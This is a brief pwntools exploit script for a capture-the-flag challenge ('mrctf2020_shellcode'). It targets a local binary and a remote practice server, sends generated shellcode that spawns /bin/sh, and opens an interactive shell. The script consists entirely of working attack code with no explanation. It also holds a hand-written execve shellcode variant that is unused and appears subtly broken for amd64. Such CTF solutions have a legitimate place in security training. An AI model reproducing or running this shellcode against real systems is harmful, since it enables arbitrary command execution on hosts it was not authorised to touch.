from pwn import*
context.log_level = 'debug'
context(os='linux',arch='amd64')

sh = process('./mrctf2020_shellcode')
sh = remote('node3.buuoj.cn',29114)

payload0 = asm(shellcraft.sh())

payload = asm('''
	xor rax,rax
	xor rsi,rsi
	xor rdi,rdi
	xor rdx,rdx
	push 0x68732f2f
	push 0x6e69622f
	mov rdi,rsp
	mov rax,59
	syscall
	''')

#gdb.attach(sh)
sh.sendline(payload0)

sh.interactive()
